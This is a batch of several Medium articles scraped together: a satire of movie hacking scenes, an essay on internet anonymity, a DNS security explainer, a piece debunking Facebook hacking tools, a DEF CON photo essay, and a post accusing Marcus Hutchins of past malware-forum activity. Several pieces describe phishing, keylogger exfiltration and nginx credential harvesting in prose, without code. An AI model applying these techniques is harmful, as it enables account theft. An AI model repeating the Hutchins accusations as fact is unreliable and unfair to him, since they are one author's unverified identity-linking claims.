Even if you know nothing about computers you would still be left scratching your head when Levinson (Jeff Goldblum) uploads a virus from his 1995 Apple Mac PowerBook to an alien mothership, disabling their shields and giving us humans a chance to blow those dirty aliens back to where they came from (serves them right for not having a decent firewall).
After the initial alien-killing high wears off, it’s not long before that “hang on a second” feeling starts to creep in. How are these systems even compatible? How did Levinson manage to wirelessly upload the virus in pre-Wi-Fi 1996? One thing’s for sure, it’s not just here on Earth that Mac users mistakenly believe they’re impervious to malware.
I feel a little bad including Independence Day on the list as I kinda like it, plus a deleted scene included on the DVD makes the virus scene more believable…kind of. A whole seven minutes of exposition was cut, which told us how Levinson deciphered the alien language and was able to make it compatible using the crashed Roswell ship. Also the huge wad of cash Apple handed over for product placement might also help explain things.
What doesn’t help explain things is writer and producer Dean Devlin’s Reddit AMA in which he tried to explain how the virus worked: “As any beginning programmer can tell you, binary code is a series of ones and zeroes. What Goldblum’s character did was turn the ones into zeroes and the zeroes into ones, effectively reversing the code that was sent.” It all makes total sense now, thanks Dean!
This show is so bad it gets two notable scenes included.
First up: Mac Taylor (Gary Sinise) and cohorts are looking at an online chat involving a murderer, when one genius cop realizes “this is in real time!” another spouts the immortal words, “I’ll create a GUI interface using Visual Basic, see if I can track an IP address.”
First of all, let’s get the semantics out of the way. The cop actually just said “I’ll create a graphical user interface interface,” but maybe I’m just being pedantic. The real issue with this scene is why the hell would you want to create a GUI to track an IP address? Don’t most software already have one of these? And simply Googling “IP lookup” will provide you with a myriad ways to track an IP address, for free, and you don’t even have to create a GUI or learn Visual Basic.
Round 2: Mac and his buddies are questioning a suspect in the online virtual world Second Life. When Mac starts asking the guy — I say guy but he’s actually a blue fox — questions, he jumps on a jet-powered hoverboard and flees. Mac then dons a jetpack and gives chase, all the while controlling his avatar using what looks like a number pad. Now, I’ve never actually played Second Life but I’m pretty sure if you wanted to get away from someone it’d be a lot easier to just log out.
This one’s a classic. Computer expert Felicity Smoak is in the middle of a hack-off with a bad guy when he somehow starts to send a power surge through the computer, causing sparks to fly out of every electronic device in the room. Felicity uses her hacking super powers and quickly sends the baddie an “executable” which fires the power surge right back at him, causing the poor guy to be blown clear across the room. Even Superman can’t do that. Making a computer self-destruct like that is so far-fetched…or is it?
There are so many bad computer/hacking scenes on TV and in movies that it was difficult to boil them down to just five, but the number one spot was always going to go to everyone’s favorite naval cop show NCIS.
The show’s digital forensics specialist/resident goth Abby announces that the NCIS network is being hacked as she frantically tries to mitigate the situation by typing furiously fast and really loud on her keyboard (why do Hollywood hackers never use a mouse?). This tactic doesn’t seem to be working so another agent offers to help out. After all, what’s better than one person typing really fast and loud? You guessed it, two people typing really fast and loud…on the same keyboard.
Again, I’m no hacking expert but I have used a keyboard and I’m pretty sure that would create more than a few syntax errors. And just when you think this scene can’t possibly get any better, Agent Gibbs saves the day by unplugging the computer from the power outlet.
I know that portraying hacking on screen is tough; it’s difficult to make what’s usually a screen full of text visually interesting. But it’s not impossible to make hacking work on TV or film — just look at Mr. Robot as a perfect example of this. The show is technically accurate but as writer/producer Kor Adana puts it, “we work hard to ensure that the stakes of the scene and the character motivations are clear even if you have no idea how the technology works.”
So knowing that it can be done in an interesting, dramatic, and technically accurate way, are all those ridiculous on-screen hacking scenes actually some kind of in-joke amongst the writers? Turns out that might actually be the case, if this post on Reddit by an anonymous screenwriter is to be believed: “We write those scenes to be inaccurate and ridiculous on purpose. I guess you could call it a competition of one-upping other shows […] Sometimes the exec producers and directors are in on it, and other times we just try to get bits and lines into scripts.”
*Johnny Mnemonic did not make this list as any film that has Dolph Lundgren chewing the scenery as a religious killer who spouts “Jesus time!” when he murders people is okay in my book. Plus it’s got a cyborg dolphin in it as well, which is always a good thing.
Written by
","['KNOWLEDGE', 'CAREERS', 'HISTORY OF...', 'DEEP DIVES', 'ARCHIVE', 'SYMANTEC BLOG', 'Movies', 'Hacking', 'TV', 'Cybersecurity']"
The Internet Is Broken. Here’s How I’d Fix It - Walter Isaacson - Medium,https://medium.com/@walterisaacson/the-internet-is-broken-heres-how-i-d-fix-it-19d0b2503aee?source=tag_archive---------2-----------------------,"My big idea is that we have to fix the internet. After 40 years, it has begun to corrode, both itself and us. It is still a marvelous and miraculous invention, but now there are bugs in the foundation, bats in the belfry, and trolls in the basement.
I do not mean this to be one of those technophobic rants dissing the Internet for rewiring our brains to give us the twitchy attention span of Donald Trump on Twitter or pontificating about how we have to log off and smell the flowers. Those qualms about new technologies have existed ever since Plato fretted that the technology of writing would threaten memorization and oratory. I love the internet and all of its digital offshoots. What I bemoan is its decline.
There is a bug in its original design that at first seemed like a feature but has gradually, and now rapidly, been exploited by hackers and trolls and malevolent actors: Its packets are encoded with the address of their destination but not of their authentic origin. With a circuit-switched network, you can track or trace back the origins of the information, but that’s not true with the packet-switched design of the internet.
Compounding this was the architecture that Tim Berners-Lee and the inventors of the early browsers created for the World Wide Web. It brilliantly allowed the whole of the earth’s computers to be webbed together and navigated through hyperlinks. But the links were one-way. You knew where the links took you. But if you had a webpage or piece of content, you didn’t exactly know who was linking to you or coming to use your content.
All of that enshrined the potential for anonymity.
You could make comments anonymously. Go to a webpage anonymously. Consume content anonymously. With a little effort, send email anonymously. And if you figured out a way to get into someone’s servers or databases, you could do it anonymously.
For years, the benefits of anonymity on the net outweighed its drawbacks. People felt more free to express themselves, which was especially valuable if they were dissidents or hiding a personal secret. This was celebrated in the famous 1993 New Yorkercartoon, “On the Internet, nobody knows you’re a dog.”
Now the problem is nobody can tell if you’re a troll. Or a hacker. Or a bot. Or a Macedonian teenager publishing a story that the pope has endorsed Trump.
This has poisoned civil discourse, enabled hacking, permitted cyberbullying, and made email a risk. Its inherent lack of security has allowed Russian actors to screw with our democratic process.
The lack of secure identification and authentication inherent in the internet’s genetic code has also prevented easy transactions, thwarted financial inclusion, destroyed the business models of content creators, unleashed deluges of spam, and forced us to use passwords and two-factor authentication schemes that would have baffled Houdini.
The trillions being spent and the IQ points of computer science talent being allocated to tackle security issues makes it a drag, rather than a spur, to productivity in some sectors.
In Plato’s Republic, we learn the tale of the Ring of Gyges. Put it on, and you’re invisible and anonymous. The question that Plato asks is whether those who put on the ring will be civil and moral. He thinks not. The internet has proven him correct.
The web is no longer a place of community, no longer an agora.
Every day more sites are eliminating comments sections.
If we could start from scratch, here’s what I think we would do:
Most internet engineers think that these reforms are possible, from Vint Cerf, the original TCP/IP coauthor, to Milo Medin of Google, to Howard Shrobe, the director of cybersecurity at MIT. “We don’t need to live in cyber hell,” Shrobe has argued.
Implementing them is less a matter of technology than of cost and social will. Some people, understandably, will resist any diminution of anonymity, which they sometimes label privacy.
So the best approach, I think, would be to try to create a voluntary system, for those who want to use it, to have verified identification and authentication.
People would not be forced to use such a system. If they wanted to communicate and surf anonymously, they could. But those of us who choose, at times, not to be anonymous and not to deal with people who are anonymous should have that right as well. That’s the way it works in the real world.
The benefits would be many: easy and secure ways to deal with your finances and medical records. Small payment systems that could reward valued content rather than the current incentive to concentrate on clickbait for advertising. Less hacking, spamming, cyberbullying, trolling, and the spewing of anonymous hate. And the possibility of a more civil discourse.
This essay is partly drawn from a talk delivered to the American Academy of Arts & Sciences. It was originally published on LinkedIn.
Written by
","['Internet', 'Technology', 'Comments', 'Information Security', 'Cybersecurity']"
The Internet’s Phone Book Is Broken - OneZero,https://onezero.medium.com/the-internets-phone-book-is-broken-9fcdd6ca726b?source=tag_archive---------2-----------------------,"Back in January, the Cybersecurity and Infrastructure Security Agency, a division of Homeland Security, issued its first emergency directive requiring federal civilian agencies to secure themselves against a global hacking campaign targeting the Domain Name System (DNS) that security firm FireEye claims with “moderate confidence” was sponsored by the Iranian government.
Security firm Farsight has alleged that DNS vulnerabilities played a role in the infamous Democratic National Committee email hack. Motherboard reports that Venezuelan President Nicolás Maduro’s administration appears to have abused DNS vulnerabilities using what’s known as a homograph attack to collect names, email addresses, passwords, and other personal information from anti-Maduro activists.
For five hours on October 22, 2016, anyone who logged into an unnamed Brazilian bank’s website actually gave their login credentials to hackers who utilized weak points in the bank’s DNS infrastructure. Last April, the same thing happened to users of a cryptocurrency exchange, resulting in more than $150,000 being stolen from users of the exchange.
Most of us assume core internet infrastructure like DNS will always work as advertised. Simply type the URL for your bank’s website into your browser, and milliseconds later, you should be looking at your bank’s login page. Punch in your credentials and you’re off to the races, browsing your account activity, transferring money, and bemoaning last weekend’s ill-advised bar tab. Simple, safe, secure. But as the victims of these attacks learned the hard way, that’s not always the case.
The vast majority of DNS traffic is still verified using the honor system.
DNS is the umbrella term for the protocol and series of servers that take a “name” such as “www.medium.com” and turn it into an IP address, which is used to route requests through the internet to their destination. The system’s primary purpose has led many to describe DNS with a metaphor as dry as the source material: DNS is the internet’s yellow pages. But hidden behind its mundane facade is a veritable cornucopia of malicious opportunity.
The attacks against DNS are quite well known within the security world — DNS is ubiquitous and often poorly secured by IT professionals, making it a juicy target for hackers. The system is engaged almost every time a device sends data across the internet, meaning a single weakness at the protocol level opens literally every internet user to DNS-based attacks. The tedious and unremarkable nature of DNS lulls IT specialists into a false sense of security and makes breaching the protocol appealing to hackers. That might all be fine if the system were secure by default, but the vast majority of DNS traffic is still verified using the honor system.
The decentralized database protocol was defined in 1983 by Paul Mockapetris to help the burgeoning internet handle increasing request volume. The optimism and innate sense of trust that guided so much of the early internet’s innovation was imbued into DNS; the original specifications of DNS had no encryption and no way to verify that a name-to-address mapping wasn’t spoofed or hijacked. These shortcomings remain as part of DNS’s vestigial DNA.
There are two major kinds of DNS servers: name servers and resolvers. Name servers are the source of truth — they map names of web services, such as google.com and fbi.gov, to IP addresses. Resolvers are the concierges of the DNS world — they query all the relevant name servers on our behalf and then give us the resulting IP address.
While plenty of standards modifications and encryption-providing alternatives have emerged, the default state of DNS traffic is still unencrypted. The most widely used and de facto standard DNS resolver, BIND, still does not offer encryption in its latest version and has several well-documented security vulnerabilities. Without significant manual labor, your DNS traffic is sent across the internet in plain text. This gives a motivated adversary — and your ISP — a wealth of information about what websites you visit, how often you visit them, and when you visit them. This information has been sold to advertisers, and depending on which websites you’re visiting, it might well be used as part of a cyber-extortion scheme.
DNS is well known as a leaky pipe, sometimes even leaking information through the protection of a VPN and providing adversaries with a tool to deanonymize Tor traffic. But the problems with DNS don’t stop at privacy.
Attacks against DNS have become so common that in February, the Internet Corporation for Assigned Names and Numbers (ICANN) — the nonprofit responsible for coordinating and maintaining much of DNS’s critical infrastructure — issued a warning:
It is essential that members of the domain name industry, registries, registrars, resellers, and related others take immediate proactive and precautionary measures, including implementing security best practices, to protect their systems, their customers’ systems and information reachable via the DNS.
In addition to privacy leaks and phishing attacks, DNS has been used to covertly install and control malware, exfiltrate data from secure servers, and bring web infrastructure to its knees in denial of service attacks.
Because DNS data is rarely encrypted, it is highly susceptible to man-in-the-middle attacks, where DNS queries and responses are replaced or modified in transit. By modifying DNS queries, attackers can trick unsuspecting users into loading malicious websites. These types of attacks are often used to direct users to a lookalike website, where the users’ credentials are harvested. This is the central tactic behind the two phishing schemes targeting Brazilian banks and the cryptocurrency exchange.
In the Brazilian banking scheme, attackers appear to have compromised employee credentials to the bank’s DNS infrastructure, allowing them to modify the DNS records from the source. Other DNS poisoning schemes involve infecting home routers with malware that swaps out DNS records as they transit. Last September, an enormous DNS poisoning botnet was found to have infected more than 100,000 routers, mainly in Brazil.
The attack against a cryptocurrency exchange last April was a bit different. Sophisticated attackers exploited DNS’s lack of encryption and verifiability, as well as another well-known attack vector called a BGP leak, in order to steal users’ credentials. Major DNS infrastructure operated by Amazon was also targeted in the attack. Hackers were able to redirect DNS queries asking for the exchange’s IP address to infected servers. The infected servers returned bogus IP addresses in response, successfully masquerading as the authoritative DNS servers that the cryptocurrency exchange pays Amazon to operate on its behalf.
By masquerading as one of the authoritative name servers, attackers were able to trick major DNS resolvers to save the fraudulent records, which allowed them to steal data from even more victims. Major resolvers, including Cloudflare’s 1.1.1.1 and Google’s 8.8.8.8, were tricked into serving the poisoned DNS records, amplifying the attack’s impact.
Fortunately, other safeguards are in place that can help mitigate the impact of attacks like these. Transport Layer Security (TLS) — the foundation of many encrypted web requests, including all HTTPS traffic — provides mechanisms to ensure that the server you’re communicating with actually belongs to the organization you think it does. Using a digital certificate and public key encryption, your browser can often detect phishing websites. In the attack against the cryptocurrency exchange, the perpetrators were unable to fake a digital certificate, which means the vast majority of users would have seen a warning page generated by their browser:
Users who chose to disregard this warning were directed to a website that looked very much like the real exchange website. When those users typed in their login credentials, the attackers saved their credentials and then forwarded the users to the real cryptocurrency exchange site. From a user’s perspective, it appeared as though they had logged in successfully after a weird security warning.
Clever attackers have also abused DNS without directly intercepting or altering web traffic. The use of internationalized domain names — which allow domains to use Unicode characters in addition to the limited ASCII character set — has allowed attackers to register domain names that look an awful lot like well-known domains but send you to malicious IP addresses. Consider the following URLs (but do not paste them into your URL bar):
Medium[dot]com
Meḍium[dot]com
Can you see the dot below the “d” in the second URL? You would be forgiven for thinking it was just a speck of dust on your screen, but it’s actually the Unicode character U+1E0d, a “Latin small letter d with dot below.” Security writer Brian Krebs explains how these characters have been used to direct unsuspecting users to phishing sites. Merike Käo, the former CTO of Farsight Security, spoke about this vulnerability at the RSA conference in 2018, stating that malicious registry of homographs (words that look similar) is widespread and especially common for famous brands. Even worse, attackers can easily obtain a digital certificate for the bogus domain, which means victims won’t get a security warning from their browser.
Recently, DNS has been abused to trick users into installing DNSpionage, a type of malware that then uses DNS to receive commands from the attackers and exfiltrate data from infected hosts. Cisco’s Talos Intelligence team described this DNS double whammy last year. On highly secure networks, inbound and outbound data are tightly monitored and analyzed for suspicious or risky behavior. But because DNS is so widely used and so boring, many network administrators overlook DNS as an attack or exfiltration vector — hence ICANN’s call for improvements earlier this year. This lackadaisical attitude is part of what DNSpionage exploits. By hiding malicious traffic inside DNS queries, attackers were able to sneak it past network firewalls, enabling them to both steal data and control the DNSpionage malware. But because DNS truly is critical to the operation of any network, this security hole can be hard to plug.
It’s hard to lay all the blame for these vulnerabilities at network administrators’ feet. Any big organization will generate massive amounts of legitimate DNS traffic, which makes finding and preventing malicious DNS queries a bit like plucking a needle from a haystack. Still, experts have noted that security extensions to DNS that were standardized way back in 2005 (called DNSSEC) would mitigate or prevent a huge amount of DNS-based phishing attacks, as well as some of the vulnerabilities that DNSpionage exploits. Currently, however, only about 20 percent of DNS traffic is secured with DNSSEC.
It’s wildly irresponsible for operating systems developers and DNS providers to continue neglecting such a widely abused attack vector.
DNS has also been abused to execute denial of service (DoS) attacks. The goal of a DoS attack is to render some internet service unusable — and DNS is often used as a tool to orchestrate DoS attacks, as well as being a popular target of such attacks. In 2015, Turkish DNS infrastructure was taken offline by a DoS attack, rendering nearly all 400,000 websites with a .tr domain unreachable. In 2016, a DoS attack targeting Dyn’s DNS infrastructure rendered huge swaths of the internet unreachable for North American and European users.
DNS is vulnerable to both “reflection” and “amplification” attacks, making it a popular choice for DoS attacks. With reflection, attackers send a DNS request with a spoofed source IP address. This allows attackers to leverage powerful DNS resolvers to generate more traffic than the attackers could on their own. Amplification happens when a very small query results in much larger responses. Used in combination, attackers send a lot of very small DNS requests to unsecured resolvers, which then send a lot of very large responses to the victim.
Protocols providing end-to-end encryption for DNS traffic have been standardized. One such standard uses the same TLS protocol that encrypts HTTPS traffic to encrypt DNS traffic. While the DNS over TLS standard has been adopted by some major providers and resolvers, including Google and Cloudflare, many others still do not support the protocol, which could seriously curtail man-in-the-middle attacks.
Making matters worse, most operating systems still do not support DNS over TLS out of the box — and configuring a nonstandard DNS resolver is quite a challenge for most users. Although it is relatively easy to enable DNS over TLS on up-to-date Android devices, support for encrypted DNS on Windows 10, Mac OS, iOS, and BIND still lags behind. And unless both sides of the connection support DNS over TLS, the connection will be forced to fall back to unencrypted methods.
It’s the same story for DNSSEC, which protects DNS responses against malicious tampering through the use of digital signatures instead of encryption. While the protocol has been standardized since 2005, adoption lags behind, leaving many of us vulnerable to DNS hijacking and poisoning attacks. In an ironic twist, DNSSEC is the feature that makes DNS most susceptible to amplification attacks. This fact serves as a reminder that software security is a world full of trade-offs and imperfect options.
Kirstjen Nielsen, chief of the Department of Homeland Security, recently indicated that cyberwarfare is the greatest threat to the United States and the companies that operate here. Nation-states, cybermercenaries, and organized cybercriminals are all becoming more sophisticated in the dark arts of malicious computing. It’s terrifying that a core piece of infrastructure like DNS is so riddled with vulnerabilities, and it’s infuriating that most of the problems have been solved in theory but continue to exist in practice due to slow adoption and poor security practices.
DNSSEC has been available since 2005, but only 20 percent of DNS traffic is secured by it. On the other hand, we have DNS over TLS, which was introduced in 2016 and is already supported by Google, Cloudflare, Quad9, and others, proving it is possible to keep up with security standards. But because most operating systems still don’t support the standard, very few users are able to realize the benefits of encrypted DNS. Enterprise IT, DevOps, and security teams should definitely audit their DNS configurations and infrastructure — or consider paying a provider with a serious commitment to security, such as Cloudflare or NS1.
For the savvy and paranoid, it is possible to install an alternative DNS resolver, such as Unbound, or even build a DNS proxy using a Raspberry Pi and have your router redirect all your DNS traffic through the proxy. For everyone else, your best bet right now is to switch to a DNSSEC-supporting resolver like 8.8.8.8, 1.1.1.1, or 9.9.9.9.
It’s wildly irresponsible for operating systems developers and DNS providers to continue neglecting such a widely abused attack vector — especially for companies that talk a big game on privacy, like Microsoft and Apple. We should demand support by default for DNS over TLS from companies like Microsoft and Apple—before we lose even more of our personal information to nefarious actors.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'Cybersecurity', 'Domains', 'Malware', 'Digital Life', 'Industry']"
The lies about Facebook hacking software - Littl3field,https://littlefield.co/the-lies-about-facebook-hacking-software-74422baf6a87?source=tag_archive---------3-----------------------,"Learn the truth about Facebook hacking and don’t get suckered in.
Anybody who works in cyber security or forensics hears the same story every time, “Ohhhh so you do hacking and stuff, that’s cool can you hack someones Facebook for me”. As annoying as that is, we’re in an age where everyone wants to invade everyone else’s privacy. We have to face up to that fact. We need to accept that social networks are changing relationships between everyone. Even the small amount of privacy we do have, is trying to be exploited by someone, somewhere. I would think that at least once, EVERYONE with an account on Facebook, has thought about hacking a Facebook account for free.
If you have in fact tried to search how to do this, I guarantee the end result might have probably been a disappointing one. Right? 90% of the people who wish and then actually put effort to hack online accounts never really succeed, if anything they have merely just spend hours wasted. However, there is in fact that 10%, that actually do succeed.
If you’re reading this right now, I’ll assume it means that you belong to the 90% of people who fail to hack the password of the Facebook account they wish to. I chat to friends, colleagues and acquaintance’s all that time that talk to me about how they have a friend who’s done this, or seen this to hack accounts etc etc. But here’s the thing, anybody who asks somebody within the ‘hacking’ sphere to hack a Facebook account, probably thinks this:
The truth is, all of this is complete and utter, unfathomable ‘BS’.
There is no ease to hacking Facebook accounts. It almost makes me laugh. There are no such JavaScripts or codes that could hack Facebook accounts or free to download software systems. Do you honestly think that a company worth $180 billion, with one of the best cyber security teams, would miss a hack that you got off some dodgy website that asked you to fill out an online survey for a password?
There are no such software, programs, tools or applications that can hack Facebook accounts just with some clicks. They are all absolute nonsense.
You might have heard of some popular online hacking tools with absolutely ridiculous names and all. But people are actually building software to simulate ‘Hacking Facebook’. Why? Because:
But the worst thing of this all, is that even though thousands of people have fell for these stupid softwares that tempt you in; they are still around and people are still getting suckered in. Here’s a few that are very popular, very clever and stupidly named ‘Hacking tools’ that are still fooling people:
These are some of the top scams on the internet I’ve seen. Because they have such a great temptation for people. They make a hell lot of money luring in people who aren’t aware of the truth. If you happen to see any of these software in the way ahead of you, please, for the love of God, don’t use them.
But right now, you’re probably thinking “yeah I get all that, but I bet there are hackers who can in fact hack Facebook accounts” . Well yes. Yes there are. In fact, there are millions. In fact, every Joe Bloggs, can do it just with some efforts. But, please don’t. I’m again reminding you that it’s highly against the law.
So, how do cyber specialists do it?
Even though the software and tools talked about above do not work. There are methods used in order to hack a Facebook account. In fact, there are tones. But, here are two of the most common Facebook hacking techniques that everyone should be aware of; for everyone’s security.
Says it all in the title really, doesn’t it? Keylogging is basically the process of recording every keystroke made by a victim into a encrypted log file. It is used to record instant messages, e-mails, text documents… simply put, any information you type using your keyboard.
Using keylogging, the hacker can access the victim’s password, along with the other things he or she types into their computer.
So, simply put, here is how the process works:
The hacker creates the keylogger application. This software is built in such a way that if someone opens it, it will infect in their computer. So, the hacker then sends the keylogger or plants it on the victim’s computer.
When the victim opens it — it’s done. The system will be infected and will be ready for action. It is mandatory that the computer system should have internet connection in it, so that the saved keystrokes will be sent to the hackers email or FTP account later. If this has happened, the hacker gets the golden information, along with the password of the Facebook account.
Phishing can be alternatively labelled as a “Fraudulent Technique“.
This is the process where the hacker creates a fake log in page and sends the link out to the victim. The victim then gets fooled into it and tries to log into the fake page. The information typed in on the fake page is then send to the hacker, thus retrieving the Email ID and Password of the Facebook account — just like that.
It can be also done by sending out a fake email to the victim, fooling them your authority and asking for your Email ID and Password. Again, just like that. This is perhaps the most widely used method by rudimentary hackers and has been applied to many other sites too, like PayPal and eBay.
Of course there are thousands of other methods of hacking Facebook accounts, but for everyone’s security — you should always know about these.
You that you know some of the truths of Facebook hacking, don’t fool for the ‘BS’ again. There are no free Facebook hacking tools or easy way around getting into accounts. Watch out and avoid all those crazy fake applications, it will just get yourself hacked or your money stolen. But even if these software’s did work and for the people using keylogging & phishing methods; people forget that this is illegal. Yes… this is REALLY illegal. And breach of The Computer Misuse Act 1990 could leave you with a big enough fine to render you bankrupt and also locked up for a good number of years.
You can follow me on twitter on @RyLittlefield
Written by
","['Hacking', 'Facebook', 'Cybersecurity']"
The Long Con - Wesley McGrew - Medium,https://medium.com/@mcgrewsecurity/the-long-con-f9654a658bb7?source=tag_archive---------8-----------------------,"A Black Hat USA 2017 and DEF CON 25 photo essay.
All photos taken with a Sony A7R, selected for low light capabilities and convenience of standard focal lengths (full frame).
For lenses, I limited myself primarily to a Soviet Jupiter-12 from 1962. It is a 35mm f2.8 prime, and an absolute joy to use, adapted, on mirrorless cameras like the A7R. This lens has a lot of flaring and other “character” that make it interesting to work with. I bought it on eBay just before the trip, and it’s one of my favorite lenses now.
For the portaits of Roxy, and many of the images after that point, I switched to a Mitakon 50mm f0.95 for low light and thin depth of field.
Having a base of operations in the Palace Tower of Caesars, with elevators that stop at two of the DEF CON floors, was great for being able to quickly get where we needed. It also served as a handy “exit” when the crowds became overwhelming. During Black Hat, a lot of Uber rides were required, but events were scattered around the strip enough that it didn’t seem to matter where I was staying.
The mornings before Black Hat were a good time to walk around and take photos before getting a ride to Mandalay Bay’s Convention Center.
The lobby bar looked different, filled with DEF CON attendees, later in the week.
Gordon Ramsay’s Pub & Grill is a favorite. I’m a sucker for good “bar food”. A friend and I wound up being seated at the round table in the foreground of this picture on our last night in Vegas. Go for the fish & chips.
Are we tired of puns, hashtags, and binary numbers in infosec marketing material?
Hack no.
Danielle A Kingsbury (Twitter: @missdkingsbury) operates cybersecpsych.com, where she writes about the intersection of psychology and cyber security. Among other interesting (and upcoming) research, she has worked to develop models of how users learn from security training programs.
Most attempts at bringing psychology into cyber security, especially those focused on “social engineering”, do poorly at bringing real expertise and solid research from other fields into computing. Danielle’s work does bring another field’s experiences to the table, and though this was her first Black Hat event, I wouldn’t be surprised to see her speaking at them in the near future.
I gave my presentation, Protecting Pentests: Recommendations for Performing More Secure Tests, at Black Hat on Wednesday at 5:05 PM. A short 25-minute talk is a new challenge for me.
This presentation was the capstone for several years’ worth of my presentations at Black Hat USA and DEF CON, and it will be interesting to tackle a completely new problem.
Nice job, Anonymous. Now you’re just part of the ad copy.
You could have one WiFi Pineapple and hop all of the channels to capture traffic. But you might miss something. Better to have one for each channel.
#wificactus
Selena Larson is a cyber security reporter with CNNTech that is improving the state of information security journalism with every article she writes. Cyber security news moves fast, so it’s hard to check facts and avoid the bias of sources, businesses, and government. Selena manages to get through all of the confusion and write articles in a way that the lay person can understand the impact of breaches, vulnerabilities, and nation-state attacks on their lives.
I like talking to writers about writing, and she indulged me patiently. We then talked about attribution of cyber attacks, which is why I’ve taken her photo with a Soviet lens and surrounded her by Russians in this photo essay.
While Black Hat USA 2017 drew to a close, DEF CON 25 tightened its grip on the upcoming weekend.
Roxy is a friend that I have run around DEF CON with for several years now. She organized this year’s Dallas-Fort Worth area code 214 meetup at DEF CON, and works towards using her success in information security to help others get into the field. Numerous times over the weekend, she was meeting with those seeking career advice, and she frequently buys computer security books for those who cannot afford to bootstrap their own careers.
She made this simple-yet-stylish cyber-themed dress for the event, and I did my part to document the results. She was featured on the adafruit blog for this outfit, and would like to organize a cyber-themed fashion show soon.
Caesars staff appeared to have been ordered to have a sense of humor about DEF CON attendees’ decorations. Googly-eyes and stickers mostly stayed in place until the conference was over.
Whose Slide is it Anyway is a simple concept: nonsense, funny slide decks are created and chosen randomly by participants who have no prior knowledge of their contents. The participants present their assigned decks, while judges heckle them, then score them with decks of over-sized playing cards. It’s a new event at DEF CON, organized by r@ndoh!. He’s put a lot of work into making a chaotic event fun and humorous for contestants, judges, and the audience.
This contestant (to the left and below) took offense to the judge’s scoring and followed yours truly and a friend around afterwards for several minutes, trying to get us to justify his score.
This is not a game to be taken that seriously and please, respect others’ personal space.
Though I like to hang out with anyone who reaches out and wants to talk about security, there is a special kinship with fellow “breakers”. Clever penetration testers, (actual) hackers, and anyone else with the instinct of a villain is likely to become a fast friend.
Jek Hyde (Twitter: @HydeNS33k) is an expert social engineer, physical penetration tester, and, I’m happy to say, a new friend of mine. She’s become more well-known recently for live-tweeting physical penetration testing engagements, and provides services through her company, Sincerely Security. After talking shop with her for a while about penetration testing, it’s clear she’s very good.
She takes some heat from others in the field over concerns about the OPSEC of her livetweets (though there is no leak or disclosure involved). Here, after judging Whose Slide is It Anyway, she enters into a debate with a critic, in what is possibly my favorite photo of the week…
…and listens as an out-of-work penetration tester tells us his tale:
Having served duty as a journalist and photographer, she’s the only one trusted to turn my weird little camera back on me…
Once we extracted ourselves, we planned on taking some portraits around the conference and on the street, after taking a few shots of my friend, a musician (and fellow penetration tester) called ICF — I Commit Felonies (Twitter: @icommitfelonies). He was the DJ/performer for BlanketFortCon, and had a live electronic music performance prepared (a rarity among DJs at DEF CON). You can listen to him on SoundCloud for now, but he has an EP about to drop, and it’s great.
Later, low-light portraits and some simple street photography
The next morning, waiting for Roxy’s flight in the Lobby Bar with Jelena Milosovic (Twitter: @_J3lena_), a pediatric and ICU nurse that is involved in cybersecurity research.
Then, it was time for our flights back home.
Contact :http://twitter.com/mcgrewsecuritywesley.mcgrew@hornecyber.com
Written by
","['Cybersecurity', 'Blackhat', 'Defcon', 'Photography', 'Photojournalism']"
The Man Who Cracked the Lottery - New York Times Magazine - Medium,https://medium.com/new-york-times-magazine/the-man-who-cracked-the-lottery-1d5dd6f3df2e?source=tag_archive---------2-----------------------,"By Reid Forgrave
Written by
","['Lottery', 'True Crime', 'Cybersecurity', 'Hacking', 'Technology']"
The Marcus Hutchins I knew - IPostYourInfo - Medium,https://medium.com/@userbased/the-marcus-hutchins-i-knew-882176493fdf?source=tag_archive---------4-----------------------,"To be completely honest, I didn’t know him as Marcus Hutchins at the time. I knew him only by his IRC and forum nick, Touchme.
I first encountered Touchme during my tracking of a different individual, betamonkey. Betamonkey was the the coder of betabot, a piece of malware also known as neurevt. I had encountered betamonkey posting about his still under development malware on opensc.ws, a malware development forum and had grown irritated with his posting manner. I later found his development thread of hackforums.net where he detailed the ongoing development of his malware. I kept track of it and located the malware as soon as he started testing it in the wild, posting it on a malware tracking blog I was collaborating with at the time. Someone messaged me with an IRC log of betamonkey and his initial closed beta tester reacting to the leak on an IRC server (log pasted into the blog post). As my malware tracking at the time was motivated almost entirely by watching skiddies freak out about my interactions with their botnets, I quickly sought out the server.
The IRC turned out to be irc.voidptr.cz. It was owned and managed by touchme. I learned that touchme had tried running IRCs in the past under the name iarkey to gain attention and influence. That had failed but his latest attempt had obtained some manner of success. Touchme tried to further capitalize on this success by starting a malware/carding forum, malkit.(ws/su). Both were advertised on hackforums user signatures, although only the IRC ever gained any significant traction. Numerous logs from the IRC have been posted on pastebin, easily located with some simple google searches.
Touchme was a firm supporter of betamonkey, and went so far as to make a post on his new malware blog, touchmymalware.blogspot.com, to defend betamonkey when his malware was correctly identified as being banking malware and banned from bring sold on hackforums, his primary source of buyers at the time. The post was deleted from his site after he turned it into malwaretech.com, but it can still be seen using the internet archive (look halfway down the page). I would have expected him to be involved in selling betabot, not having the initiative and drive to code his own malware.
Around this time he ran into some issues with malkit. The domain he was using was malkit.ws, and he had come into conflict with another tiny carding forum, 0sec.biz. The first act of the conflict ended in mutual destruction, as both malkit.ws and 0sec.biz were reported to their registars and suspended. Touchme reacted by registering malkit.su. On voidptr IRC, ryanc (zeekill) made a suggestion based off his recent hacking attack against linode or someone. Use basic nginx features to establish a man in the middle phishing site. 0sec’s domain was suspended, so Touchme simply registered 0sec.su, pointed it at 0sec.biz’s IP address and posted it on Trojanforge, where both admins had been making angry posts. 0sec.biz users who had been reading the forum believed that he was the admin posting the new domain and used it to login. Touchme harvested their credentials using nginx, and discovered that one of them was an admin. He used the admin creds to dump the 0sec.biz databases. This effectively killed off the site. Trojanforge died without a backup shortly after this, however the 0sec.biz PM database on pastebin can confirm the conflict (ctrl + f for touchme).
Around his time Touchme hosted malkit.su on the same server as one of his IRC servers. This was recorded by virustotal passive DNS.
The main issue people seem to have with this is that the touchme in the IRC logs and 0sec.biz PMs could be anyone, not just Marcus Hutchins. Marcus’s current twitter handle malwaretechblog can be directly linked to touchmymalware, a closely related nick. Some have pointed to a tweet where he indicates “The “TouchMe” on darkhook isn’t me, please stop sending emails asking me about scriptkiddie stuff, thx.” as evidence that he has never used the nick, however he is denying the use of the nick on a specific forum, actually strengthens the link. Why would be deny a nick on a specific forum if he didn’t use it in other places? You can even see that it was the author nick he used on his blog when it was still touchmymalware, check the internet archive link up the post.
